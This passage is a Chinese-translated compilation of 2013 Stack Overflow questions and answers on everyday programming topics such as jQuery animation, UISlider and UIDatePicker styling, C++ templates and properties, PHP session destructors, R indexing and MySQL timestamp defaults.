不会。函数中的静态变量在第一次调用该函数时进行评估。如果您需要尽快对其进行评估，则必须将其设为全局。一种替代方法是在程序开始时简单地调用该函数，以便在您实际需要该函数之前对静态进行评估。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:31:16.210

您可以使用这样的类来伪造该函数：

```
struct test_
{
    const std::chrono::high_resolution_clock::time_point marker; 

    test_()
      : marker( std::chrono::high_resolution_clock::now() )
    {}

    void operator()() const
    {
      std::cout<<marker.time_since_epoch().count()<<std::endl;
    }
} test; 
```

尽管这可能在实践中无法使用。

# jquery - jquery水平平移云

> ID：15443649
> 
> 赞同：0
> 
> 时间：2013-03-15T23:22:36.750
> 
> 标签：jquery, image, jquery-animate, pan

我有一张云的图像，它被设置为占据屏幕 100% 的宽度。我希望能够平移它，类似于“Spritely”插件可以连续平移云的方式，但是，我没有使用 Spritely，因为这不是“背景图像”。我希望这是有道理的。

我的图像代码：

```
 <div id="clouds" style="position:absolute; z-index:99; width:100%; top:56.5%;">
   <div id="clouds1" style="width:auto;overflow:hidden; position:relative; z-index:99; left:0%;">
   <img src="Images/clouds.png" style="width:100%" />
   </div>
   </div> 
```

以这种方式使用图像允许我将其扩展到浏览器大小。

有人可以帮我弄清楚如何连续平移此图像吗？

非常感谢您的参与！

*   詹姆士

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:44:56.920

我认为您将从使用“视差水平滚动”一词搜索解决方案中受益。

您应该能够找到教程，例如

[http://www.egstudio.biz/easy-parallax-with-jquery/](http://www.egstudio.biz/easy-parallax-with-jquery/)

可以对其进行调整以响应。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T02:59:03.817

我有这个完全相同的问题。我没用云，但是很容易实现，只需要4行代码。

**HTML**

```
<div class="slideshow">  
        <ul>
            <li><img src="img1.jpg" alt="jQuery" width="350" height="200" /></li>
            <li><img src="img2.jpg" alt="Infinite Slideshow" width="350" height="200" /></li>
            <li><img src="img3.jpg" alt="only 4 lines of code" width="350" height="200" /></li>
            <li><img src="img4.jpg" alt="www.creativejuiz.fr" width="350" height="200" /></li>
        </ul>  
    </div> 
```

**CSS**

```
/* slideshow styles */
.slideshow {  
   width: 350px;  
   height: 200px;  
   margin: 3em auto;
   overflow: hidden;
   border: 3px solid #f2f2f2;
}  
.slideshow ul {  
   width: 400%;  
   height: 200px;
   padding:0; margin:0;
   list-style:none;
}  
.slideshow li { float: left; } 
```

**jQuery**

```
$(function(){
   setInterval(function(){
      $(".slideshow ul").animate({marginLeft:-350},800,function(){
         $(this).css({marginLeft:0}).find("li:last").after($(this).find("li:first"));
      })
   }, 3500);
}); 
```

来源 - [http://creativejuiz.fr/blog/doc/infinite-slideshow/](http://creativejuiz.fr/blog/doc/infinite-slideshow/)

# ios - 首次显示时如何使 UISlider 变粗？

> ID：15443652
> 
> 赞同：6
> 
> 时间：2013-03-15T23:23:14.593
> 
> 标签：ios, objective-c, cocoa-touch, uikit, uislider

我正在尝试制作一个具有胖轨道的 UISlider。我试过[这个](https://stackoverflow.com/questions/8116965/how-to-make-uislider-thicker "如何让 UISlider 变厚？")，它几乎可以工作。但是，当UISlider第一次显示时，track bar是正常的。只有当它得到一个触摸事件时，它才会变得更厚。

这是我添加到 UISlider 子类中的代码，建议如下：

```
- (CGRect)trackRectForBounds:(CGRect)bounds
{
    return bounds;
} 
```

我不明白这是如何工作的，所以我无法弄清楚为什么它不能完美地工作。以下是我的问题：

1.  这是如何运作的？
2.  我怎样才能控制它使轨道有多厚？
3.  首次绘制 UISlider 时，如何使其影响轨道？

当然，第三个问题是最重要的，尽管其他问题会帮助我理解。

要考虑的另一件事：当它第一次显示时，我隐藏了拇指：

```
[slider setThumbImage:[[UIImage alloc] init] forState:UIControlStateNormal]; 
```

当用户触摸滑块时，我会像这样显示拇指：

```
[slider setThumbImage:nil forState:UIControlStateNormal]; 
```

我提到这一点是因为我想知道这是否会以某种方式干扰 trackRectForBounds 魔法。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-16T00:55:11.470

**问题1.** 来自[文档](http://developer.apple.com/library/ios/#documentation/uikit/reference/UISlider_Class/Reference/Reference.html)：

> 如果要自定义轨道矩形，可以重写此方法并返回不同的矩形。返回的矩形用于在绘制过程中缩放轨道和拇指图像。

此方法的默认实现返回一个比它传递的矩形更小的矩形。你的只是返回它传递的内容，而不是先缩小它。

**问题2.** 返回一个更大或更小的CGRect，例如：

```
return CGRectMake(0, 0, 500, 200); 
```

**问题 3.** 我认为只有在您不设置自定义图像时才会调用该方法，这就是为什么在您将图像设置为`nil`. 如果要覆盖图像，请尝试使用看起来像您想要的方式的实际图像覆盖滑块图像。

# spring-roo - STS Spring Roo 未创建实体

> ID：15443665
> 
> 赞同：0
> 
> 时间：2013-03-15T23:24:53.253
> 
> 标签：spring-roo

我只是下载了完整的 STS 并创建了一个 Roo 项目。我执行了

```
persistence setup --provider HIBERNATE --database HYPERSONIC_PERSISTENT 
```

一切正常。然后我执行

```
database properties list 
```

我得到了一个属性列表。然后我执行

```
entity --class ~.domain.Rsvp 
```

我得到了

```
Command 'entity --class ~.domain.Rsvp' not found (for assistance press CTRL+SPACE or type "hint" then hit ENTER) 
```

有谁知道如何解决这一问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:35:29.740

你用的是什么版本的 Roo？如果您使用的是 roo 1.2.2 或更高版本，请尝试以下命令。

```
entity jpa --class ~.domain.Rsvp 
```

# jquery - jQuery传递CSS var

> ID：15443666
> 
> 赞同：-1
> 
> 时间：2013-03-15T23:25:09.577
> 
> 标签：jquery, css

我有以下设置来更改某个类中链接的颜色。由于某种原因，它不起作用。我确实需要为我正在做的事情保留这个结构。默认情况下，链接的颜色根据正在工作的 CSS 为白色。只是更改链接的 jQuery 不起作用。

```
var link_colour = "#CCC";

function linkcolor() {
$("[class='navLink']").css("color",link_colour);
}
window.onload = linkcolor;

<ul>
<li><a class="navLink" href="#"><img src="foo1.png" />xyz</a></li>
<li><a class="navLink" href="#"><img src="foo2.png" />abc</a></li>
</ul> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-15T23:26:47.427

如果你正在使用`jQuery`你永远不想使用`window.onload = fn`. 使用`$(document).ready(fn)`或`$(fn)`简称。

```
$(linkcolor); 
```

我猜这个代码在`window.onload`事件触发后运行，所以你的事件处理程序永远不会执行。 `jQuery`如果事件已经发生，将通过立即触发函数来处理这种情况，确保代码被执行。

[看到它在这里工作](http://jsfiddle.net/8n488/)

* * *

其他说`$('.navLink')`更好的答案也是正确的。但这只是您拥有的选择器的简写，应该可以正常工作。你应该改变它，但这不是问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:28:57.630

采用：

```
$('.navLink') 
```

这将正常工作以选择其类属性设置为的所有元素`navLink`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-15T23:29:40.203

下面是你应该如何用 jQuery 友好的术语来表达它：

```
var link_colour = '#CCC';
$(document).ready(function() {
    $('.navlink').css('color', link_colour);
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T23:28:56.403

我会像这样使用选择器：

```
$(function(){
 var $color = '#CCC';
 $('.navLink').css('color',$color);
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-15T23:36:30.530

那里三分。

**1) 使用 $(document).ready**

您正在使用 window.reload，在这种情况下，使用 $(document).ready。

```
$(document).ready(function(){
// My code
}); 
```

**2) 使用 .class**

不要使用 [class='']，而是使用 .class。

```
$('.navLink') 
```

这些是我的建议和对您问题的回答！

# silverlight - 按钮是文本块吗？

> ID：15443668
> 
> 赞同：0
> 
> 时间：2013-03-15T23:25:25.073
> 
> 标签：silverlight, silverlight-4.0, silverlight-5.0

我正在使用此函数通过 a 内的所有控件进行递归，并且`ListBoxItem`我在. 它总是选择 Button 而不是. 谁能看到我的功能有什么问题？`Button``TextBlock``DataTemplate``TextBlock`

```
Private Function FindVisualChild(ByVal obj As DependencyObject) As TextBlock
 Dim result As TextBlock = Nothing
 For i As Integer = 0 To VisualTreeHelper.GetChildrenCount(obj) - 1
  Dim child As DependencyObject = TryCast(VisualTreeHelper.GetChild(obj, i), DependencyObject)
  If Not child Is Nothing AndAlso TypeOf child Is DependencyObject Then
    If TypeOf child Is TextBlock Then
      Dim tbl As TextBlock = TryCast(child, TextBlock)
      If Not tbl Is Nothing Then result = tbl
    Else
      Dim tbl As TextBlock = FindVisualChild(child)
      If Not tbl Is Nothing Then result = tbl : Exit For
    End If
  End If
Next
Return result 
```

结束功能

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:52:09.423

看似简单，但确实有效！没有解释为什么它与此行下方的类型混淆

```
Private Function FindVisualChild(ByVal obj As DependencyObject) As TextBlock
Dim result As TextBlock = Nothing
For i As Integer = 0 To VisualTreeHelper.GetChildrenCount(obj) - 1
  Dim child As DependencyObject = TryCast(VisualTreeHelper.GetChild(obj, i), DependencyObject)
  If TypeOf child Is Button Then Continue For 'fixes it
  If Not child Is Nothing AndAlso TypeOf child Is DependencyObject Then
    If TypeOf child Is TextBlock Then
      Dim tbl As TextBlock = TryCast(child, TextBlock)
      If Not tbl Is Nothing Then result = tbl
    Else
      Dim tbl As TextBlock = FindVisualChild(child)
      If Not tbl Is Nothing Then result = tbl : Exit For
    End If
  End If
Next
Return result 
```

结束功能

# c++ - C++ 中的公共字段或类似 C# 的属性？

> ID：15443671
> 
> 赞同：1
> 
> 时间：2013-03-15T23:25:47.020
> 
> 标签：c++

好的，所以我正在尝试为我在 C++ 中的类创建类似于 C# 中的属性的东西。

例如。在 C# 中我会这样做：

```
int MaxHP { get; set; } 
```

或者，带有支持字段：

```
int MaxHP 
{ 
    get { return maxHP; }
    set { maxHP = value; }
} 
```

但是到目前为止，使用 C++，我只能通过以下方式复制它：

```
private:    
    int maxHP;  
    int maxEP;
public:
    int GetMaxHP() { return maxHP; }
    void UpSetMaxHP(int value){ maxHP += value; }
    void DownSetMaxHP(int value){ maxHP -= value; }
    int GetMaxEP(){ return maxEP; }
    void UpSetMaxEP(int value){ maxEP += value; }
    void DownSetMaxEP(int value){ maxEP -= value; } 
```

我必须在设计事物的方式上遗漏一些东西。在 C# 中，该属性将像字段一样访问。但是在 C++ 中，我必须执行从其他对象访问时工作方式不同的函数。

我想我可以这样做：

```
public:
    int MaxHP; 
```

但这感觉就像我有点违背了目的。所以我的问题是，我这样做是对的还是有更好、更正确的方法来实现这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:55:02.500

Rather than creating separate getter and setter functions, you can have a function which returns a reference which can be used either way:

```
public:   
    int &max_hp() { return maxHP; } 
```

Unlike just delaring maxHP public, this allows you to place a breakpoint to see when the variable is accessed, and if you later want to add conditions or logging you can do so without changing your class interface.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:37:48.203

This feature does not exist in C/C++. You could easily argue that it's a defect to be missing but not all languages are equal. The one thing Java has that C# doesn't is singleton object-like enums. It's otherwise, IMO, a bit of a dated language, but it still has one solid feature that's missing in C#.

So what I'm saying is, when you run into these things, often you do find a genuine weakness or a design flaw. It's good to ask if you're just missing something (hence my upvote) but as you learn what strengths and weaknesses different languages have, you'll learn which languages are good for which jobs and perhaps be effective at writing DSLs or language extensions earlier in your career than later.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T23:34:03.040

To get rid of getters and setters functions in C++, I have written a simple macro that gets and sets most of data types that I use in my software. Templates also can be useful for that. For example

```
#define GET_BOOL(name) bool is##name() const {return name##_;}
#define SET_BOOL(name) void set##name(bool name) {name##_ = name;}
#define GET_SET_BOOL(name) GET_BOOL(name) SET_BOOL(name) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T23:34:19.443

C/C++ does not support anything like this by default, however it is commonplace to have functions such as `int getHP()` and `void setHP(int)` but there is kind of an operator 'hack' to make it function pretty close to how c#'s get/set works. But the code to work around this is very messy and can cause many bugs.

Example (2nd post): [http://forums.codeguru.com/showthread.php?459696-GET-SET-in-C](http://forums.codeguru.com/showthread.php?459696-GET-SET-in-C)

# c++ - c模板函数参数类型的选择

> ID：15443675
> 
> 赞同：0
> 
> 时间：2013-03-15T23:26:41.803
> 
> 标签：c++, function, templates

我是 C++ 模板的新手。我正在编写一组可以操作两个不同模板类的函数。一个需要始终按值传递，另一个必须通过引用传递，因为它代表大量数据。

这是一个简化的例子。如果 arg 被标记为 ref 类型，我希望将函数签名定义为由 const ref 获取。

```
template<bool B, typename, typename T2>
struct if_ {};

template<typename T1, typename T2>
struct if_<true, T1, T2> {
    typedef T1 type;
};

template<typename T1, typename T2>
struct if_<false, T1, T2> {
    typedef T2 type;
};

struct ByvalTypeTag {};
template<typename T>
class Byval : public ByvalTypeTag 
{
    T somedata;
};

struct ByrefTypeTag {};
template<typename T>
class Byref : public ByrefTypeTag
{
    T somedata;
};

template<typename T>
void myfunc(typename if_<std::is_base_of<ByrefTypeTag, T>::value, const T&, T>::type arg)
{

}

int _tmain(int argc, _TCHAR* argv[])
{
    Byref<int> arg;
    myfunc( arg );
    return 0;
} 
```

我得到的错误是：

错误 C2783：“void myfunc(if_::value,const T&,T>::type)”：无法推断“T”的模板参数

也许这是错误的处理方式。如果可能的话，我会尝试减少为相同功能编写的相对重复模板的数量。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:34:06.287

是的，编译器无法推断出类型。您需要自己提供 T ：

```
myfunc<ByRef<int>>(arg); 
```

或者，您可以使用更常用的标签调度系统：

```
class byref
{
    typedef byref_tag tag;
    ...
};

template < typename T >
void fun(T const& t, byref_tag) { ... }

template < typename T >
void fun(T t, byval_tag) { ... }

template < typename T >
void fun(T const& t)
{
    typedef typename T::tag tag;
    fun(t,tag());
} 
```

另一种选择将涉及包装函数和类模板。无论哪种方式，尽管外部功能都必须是 ref。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:34:56.490

您正在尝试`T`从**非推断上下文**推断类型。

参数的依赖类型中出现双冒号通常会提示您无法推断出该参数的类型（除非您在同一个函数调用中有其他推断的上下文有帮助，但这里只有一个争论）。

来自 C++11 标准的第 14.8.2.5/5 段：

> 未推断的上下文是：
> 
> — 使用限定 ID 指定的类型的嵌套名称说明符。
> 
> [...]

如果你需要一个具体的例子，**[这个 StackOverflow 上的问答](https://stackoverflow.com/questions/6060824/c-template-argument-can-not-be-deduced)**提供了一个很好的例子。在这种情况下，您可以显式提供类型参数：

```
myfunc<Byref<int>>(arg); 
```

或者，您可以选择[**第二个问答**](https://stackoverflow.com/questions/8308213/workaround-for-non-deduced-context)中提出的两种解决方法之一。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-15T23:48:21.460

您可以使用此实现转发参数。

```
template<typename T>
void myfunc_impl(T arg)
{
    // Do the work here.
}

template<typename T>
void myfunc(const T &arg, typename std::enable_if<std::is_base_of<ByrefTypeTag, T>::value>::type* = 0)
{
  myfunc_impl<const T&>( arg ); // Pass a const ref
}

template<typename T>
void myfunc(const T &arg, typename std::enable_if<std::is_base_of<ByvalTypeTag, T>::value>::type* = 0)
{
  myfunc_impl<T>( arg );        // Pass a copy
} 
```

# android - 应用销毁代码编辑

> ID：15443677
> 
> 赞同：0
> 
> 时间：2013-03-15T23:26:59.207
> 
> 标签：android, webview, ondestroy

我想销毁 webview 并在应用退出时在我的应用中启动 airpush 广告。这是一种稳定的方式还是应该将它们结合在一起

```
 public void onDestroy()
{
    if (mWebView != null)
    {
        mWebView.removeAllViews();

        mWebView.destroy();
    }
    super.onDestroy();
}

@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {
if (keyCode == KeyEvent.KEYCODE_BACK && event.getRepeatCount() == 0) {
airpush.startAppWall();
airpush.startDialogAd();
airpush.startLandingPageAd();
finish();
}
return super.onKeyDown(keyCode, event);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-15T23:31:14.723

我不明白为什么`onKeyDown`如果你只是要覆盖你甚至会覆盖`finish();`

只需将它们组合在`onDestroy`. 除非我遗漏了什么，否则您的帖子相当模糊。

另外，就个人而言，如果您的应用在我的通知栏上发布广告，我会立即卸载它。我不确定这是否是这样做的，但我知道 airpush 是臭名昭著的。只是提醒一下，有些人不喜欢这样。

# php - 未调用 PHP 析构函数

> ID：15443679
> 
> 赞同：4
> 
> 时间：2013-03-15T23:27:05.040
> 
> 标签：php

我正在使用 PHP 5.4.12

我有两节课

```
<?php

class MySessionHandler implements SessionHandlerInterface {
//..
}

$handler = new MySessionHandler();
session_set_save_handler($handler,true);

?> 
```

和

```
<?php
class MySession {
//..
function __destruct() {
     session_write_close();
     echo 'called';
    }
} 
```

使用这段代码，MySession 的析构函数永远不会被调用。

```
<?php
require_once 'MySessionHandler.php';
include_once 'MySession.php';
$test = new MySession(); 
```

但是有了这段代码，“MySession”析构函数就可以调用了

```
<?php
require_once 'MySessionHandler.php';
include_once 'MySession.php';

class Test {
    function __construct() {
        $test = new MySession();
    }
}
$obj = new Test(); 
```

我已经测试了 session_set_save_handler($handler,true/false)。我需要调用 MySession 的析构函数，因为我对 session_write_close() 有疑问；我必须明确地调用它，否则会话永远不会被写入服务器。

有什么解决方法吗？我已将代码简化为它们的根源，但 __destruct 方法不应该在应该调用的时候调用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T23:35:33.987

不要依赖`__destruct`...[从手册中](http://php.net/manual/en/function.session-set-save-handler.php)：

> 当使用对象作为会话保存处理程序时，向 PHP 注册关闭函数很重要，以避免 PHP 在关闭时内部销毁对象的方式产生意外的副作用，并可能阻止调用 write 和 close。通常，您应该使用 register_shutdown_function() 函数注册“session_write_close”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:30:43.730

在上述情况下，您需要实例化对象：

```
$test = new MySession(); 
```

# python - 在python中查找列表元素的左右手之和

> ID：15443680
> 
> 赞同：1
> 
> 时间：2013-03-15T23:27:05.650
> 
> 标签：python

有没有办法比较列表中选定元素的左右总和？例如：

```
li = [2,3,0,9,6]
if selected item is '0', I want to compare sum of 2,3 and 9,6 
```

提前致谢

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-15T23:30:08.373

```
li = [2,3,0,9,6] 
```

如果给您`0`（或任何数字）：

```
n = 0
i = li.index(n)     # returns the first location of n (0 in your case)
left = li[:i]       # gives the left part of the list
right = li[i+1:]    #     and the right part
lsum = sum(left)
rsum = sum(right) 
```

但是您必须小心，因为`.index`返回项目的*第一个*实例。如果您有多个`0`，它将​​在*第一个* `0`拆分列表。

如果你得到它的位置，就`i`从上面开始，不要搜索。

```
i = 2
left = sum(li[:i])
right = sum(li[i+1:]) 
```

请注意，我已将最后两行合并在一起，取总和而不保存单独的列表。

然后，您可以随意`left`比较`right`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-16T00:01:55.557

如果有一个`partition`可以用于`split`输入的单个值，那么 - 类似于 askewchan 的答案，但可以采用任意迭代，而不是需要能够索引的值（注意这是对 的滥用`lambda`）：

```
li = [2,3,0,9,6]

from itertools import takewhile
print (lambda L=iter(li): sum(takewhile(lambda e: e != 0, L)) == sum(L))()
# False 
```

**更明智的方式**：

```
def partitions_equal(iterable, at):
    i = iter(iterable)
    return sum(iter(i.next, at)) == sum(i) 
```

# html - 未从链接的样式表应用新的 CSS 定义

> ID：15443682
> 
> 赞同：-1
> 
> 时间：2013-03-15T23:27:14.093
> 
> 标签：html, css

在文件的头部：

```
<link type="text/css" rel="stylesheet" href="css/resources/css/lessons-matching-test.css"/> 
```

在文档正文中

```
<div class="tests">
  <a href="" style="display: block;">Link</a>
</div> 
```

在链接的 css 样式表中，我添加了这个新样式

```
.tests
{
     background-color: blue;
     /* some stuff */
} 
```

为什么当我添加`class=tests`到我的 div 时我的样式没有被应用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T23:33:58.030

当我创建一个新的 HTML 文件并插入您的代码（没有外部 css 和 js 文件）时，我得到了预期的结果。

```
<!DOCTYPE html>
<html lang="en"><!-- Forgot the quotes -->
<head>
    <meta class="metatype" content="matching-test">
    <meta charset="UTF-8">
    <style type="text/css">
        .tests
        {
             background-color: blue;
             /* some stuff */
        }
    </style>
</head>
<body>
    <div class="tests">
        <a href="" style="dispaly: block;">Link</a>
    </div>
</body>
</html> 
```

当您排除 js 文件和/或 css 文件时会发生什么？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-15T23:42:43.850

两种情况

1.  您的课程.js 正在使用 .tests 做一些事情

    ```
    <script type="text/javascript" src="js/resources/js/libs/lessons.js"></script> 
    ```

2.  您的 css 将 .tests 设置为重要，因此您无法更改

    ```
    <link   type="text/css" rel="stylesheet" href="css/resources/css/lessons-matching-test.css"/> 
    ```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-15T23:44:03.727

问题是您的旧样式由于缓存而被使用。您的新样式不会显示，因为浏览器正在使用旧样式。有几种方法可以解决或更改此问题。

避免这种情况的技术称为“缓存破坏”。当涉及服务器端处理程序时，可以用高级语言处理。但是，如果没有访问权限，则通常使用版本名称。

```
lessons-matching-test-v1.css 
```

每次进行更改时以这种方式命名您的 css 文件将允许使用和缓存新版本。曾经的版本，你会增加数字，所以版本 2 将是课程匹配测试 v2.css。

另一种方法是每次制作新版本时将查询字符串附加到路径

```
href="css/resources/css/lessons-matching-test.css?v=1.0" 
```

然后每次制作新版本时，更改查询字符串，所以版本 2 将是`href="css/resources/css/lessons-matching-test.css?v=2.0"`

# objective-c - Xcode - UIDatePicker 背景颜色

> ID：15443685
> 
> 赞同：6
> 
> 时间：2013-03-15T23:27:36.010
> 
> 标签：objective-c, ios5

![在此处输入图像描述](../Images/4e32640483ac7c4ddc0a3c5b14b7fdeb.png)我的 UIDatePicker 的背景是黑色的（因为整个屏幕的背景可能是黑色的），但我希望这个 UIDatePicker 的背景是白色的。

有没有办法改变背景颜色而不继承它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2015-06-23T12:18:16.857

```
datePickerName.backgroundColor = [UIColor grayColor]; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2021-09-20T12:36:19.103

**iOS 14 更新**

它看起来`datePicker.backgroundColor`在 iOS 14 中不起作用。它起作用了。但是你必须在设置之后把它`preferredDatePickerStyle`：

```
let picker = UIDatePicker()
if #available(iOS 13.4, *) {
    picker.preferredDatePickerStyle = .wheels
}
picker.backgroundColor = .red 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2017-02-27T12:10:22.680

**目标 C**

```
datePicker.backgroundColor = [UIColor greenColor] 
```

**迅速**

```
DatePicker.backgroundColor = UIColor.blueColor()
DatePicker.setValue(UIColor.greenColor(), forKeyPath: "textColor")
DatePicker.setValue(0.8, forKeyPath: "alpha") 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2021-04-28T00:19:20.767

**iOS 14 更新**

iOS 14 后以这种方式设置背景颜色

```
datePicker.backgroundColor = <# your bg color #> 
```

不再起作用了。

所以我现在使用键值编码方法：

```
datePicker.setValue(<# your bg color #> , forKey: "backgroundColor") 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-12-04T20:22:47.750

我有同样的问题。我刚刚创建了一个 UIView 并将其放在 UIDatePicker 后面

```
 datePickerBackground = [[UIView alloc] initWithFrame:myDatePickerView.frame];
    datePickerBackground.backgroundColor = [UIColor whiteColor];
    [self.view insertSubview:datePickerBackground belowSubview:myDatePickerView]; 
```

我声明了 UIView *datePickerBackground; 在我的课上。我重用了同一个 ViewController，所以我在卸载时将 datePickerBackground 设置为 nil。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-02-17T06:36:12.690

只需按照以下步骤操作

*   首先，您**在**. **h**文件，如：

    **UIPickerViewDelegate, UIPickerViewDataSource**

*   然后在您创建**日期选择器的位置****添加该行**

     **YourDatePicker = [[UIDatePicker alloc] init];
    YourDatePicker.backgroundColor=[UIColor whiteColor];** 
***   在您的情况下，颜色为白色，但您可以根据需要将其更改为白色。** 

 *** * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-15T23:32:42.497

通常，我会说[UIDatePicker 继承自 UIView](https://developer.apple.com/library/ios/#documentation/UIKit/Reference/UIDatePicker_Class/Reference/UIDatePicker.html)并且您可以通过类似的行以编程方式设置背景[`yourDatePickerRef.backgroundColor = [UIColor whiteColor];`](https://developer.apple.com/library/ios/documentation/UIKit/Reference/UIView_Class/UIView/UIView.html#//apple_ref/occ/instp/UIView/backgroundColor)，但事实证明 -[根据这个相关问题](https://stackoverflow.com/questions/3469149/uidate-picker-background-color?lq=1)- UIDatePicker 内部有许多子视图*，*其中一些是背景视图。

正是这些子视图，您需要将背景颜色设置为白色（而不是清晰或当前设置的任何颜色）。

是的，这有点痛苦，但这使得 UIDatePicker在能够自定义外观方面成为一个潜在*的强大对象。*

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-03-16T03:08:28.717

为什么不在`UIView`选择器后面添加一个平原。将视图的背景颜色设置为白色。给视图与选取器相同的框架。

**注意**（根据您对迈克尔回答的评论）：

挖掘 a 的私有子视图`UIDatePicker`是有风险的。它随时可能破裂。几乎可以保证，您的解决方案会因在不使用 AM/PM 的语言环境的设备上使用的日期选择器而中断，因为选择器将只有两个组件而不是三个。**

# ms-access - 缺少 DateSerial 参考？

> ID：15443692
> 
> 赞同：1
> 
> 时间：2013-03-15T23:28:25.647
> 
> 标签：ms-access

有没有人在 MS Access 中遇到过以下错误？这是 MS Access 2007 - 2010...

表达式中未定义的函数“DateSerial”？

查询是这样的：

```
TheDate: DateSerial(CInt([TABLE_BIRTH]![BIRTH_YEAR]),CInt([TABLE_BIRTH]![BIRTH_MONTH]),CInt([TABLE_BIRTH]![BIRTH_DAY])) 
```

我通过将查询简化为 DateSerial(2010,10,01) 来仔细检查查询并报告错误。

我怀疑问题是引用以某种方式丢失，但我检查了 VBA 引用并没有报告任何丢失。

我搜索了对象浏览器，发现它在 DateTime 类的成员中......

我错过了什么吗？

# r - r - 如何在变量中使用变量

> ID：15443693
> 
> 赞同：1
> 
> 时间：2013-03-15T23:28:27.780
> 
> 标签：r, variables, concatenation

我有一个数据框，其中行名是单词，我可以使用类似的方法调用该数据行的第一列

```
>df['rowB',1] 
```

我知道我可以使用粘贴来组合变量和使用粘贴的字符串来执行类似的操作

```
>paste("the value is ", df['rowB',1], "."] 
```

这将使我得到带有变量值的字符串输出。如果rowname 是一个等于'rowB 的变量怎么办？我尝试进行第一次粘贴以放入上面的粘贴，但第一次粘贴的结果不会评估为值，而只是一个字符串，上面写着

```
>rowname<-'rowB'
>type<-paste("relatype[\'", rowname, "\',1]", sep="")
'df['rowB',1]' 
```

长话短说，我想输入一个名为 'rowname' 的值作为函数的参数，并针对 rowname 的值对其进行评估，这样我就可以将该值放入同一个函数中的字符串中。

我也对完全不同的解决方案持开放态度。欢迎任何和所有建议。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-15T23:49:53.533

这应该有效：

```
paste("the value is ", get(df['rowname',1]), "."] 
```

如果你不熟悉，r 中的 'get' 类似于 python 中的 'eval'。

```
x=c('a', 'c', 'b')
a=2
x[1]
'a'
get(x[1])
2 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-16T00:14:01.693

恐怕我不明白这个问题；您的功能与以下功能有何不同？

```
foo = function(rowname = "Species", d = t(iris)){

  paste("I'm selecting", d[rowname, 1])

}

foo()
# [1] "I'm selecting setosa" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-16T00:15:46.543

不确定问题可能是什么，从您的描述中并不完全清楚，但是如果 rowname 是一个变量，您不需要任何特殊的东西，因为它无论如何都会评估它的值。让

```
mat <- matrix(1:10, nrow = 5)
rownames(mat) <- letters[1:5]
mat
##   [,1] [,2]
##a    1    6
##b    2    7
##c    3    8
##d    4    9
##e    5   10 
```

，`rowname <- "b"`然后

```
rowname
##[1] "b" 
```

所以

```
mat[rowname, 1]
##b 
##2 
```

这与 相同`mat["b", 1]`。它只会失败，如果你使用`mat['rowname', 1]`. 如果你想把它放在函数中，你可以这样做：

```
getElement <- function(mat, row.name, column.index) {

    mat[row.name, column.index]

}

getElement(mat, "b", 1)
##b 
##2 

pasteSenstence <- function(mat, row.name, col.index) {

    paste("The element of row", row.name, "and column", col.index, "is", 
            getElement(mat, row.name, col.index))

}
pasteSentence(mat, "b", 1)
##[1] "The element of row b and column 1 is 2" 
```

这也适用于`rowname <- "b"`

```
 pasteSentence(mat, rowname, 1)
   ##[1] "The element of row b and column 1 is 2" 
```

# mysql - mysql中触发函数的替代方案

> ID：15443697
> 
> 赞同：0
> 
> 时间：2013-03-15T23:28:45.947
> 
> 标签：mysql, triggers, phpmyadmin

嗨，我创建了一个表格`Create table date (id int, mydate date);`，我正在使用触发器功能将自动日期插入到表格中，例如`CREATE TRIGGER add_date BEFORE INSERT ON 'mytable' FOR EACH ROW SET NEW.mydate = NOW();` 。它在 wamp 服务器上运行良好，但在网络主机上它说

> “访问被拒绝；您需要此操作的 SUPER 权限”

我认为这是不可能使用的。但是，为了将自动日期插入表中，我可以使用什么来替代触发器功能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-16T00:09:25.893

您可以使用时间戳列来做您想做的事：

```
CREATE TABLE date (id INT, date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP); 
```

**编辑：**

正如@Michl 在评论中所说：

> “或者，从 MySQL 5.6 开始，DATE 列也可以像这样自动化。”

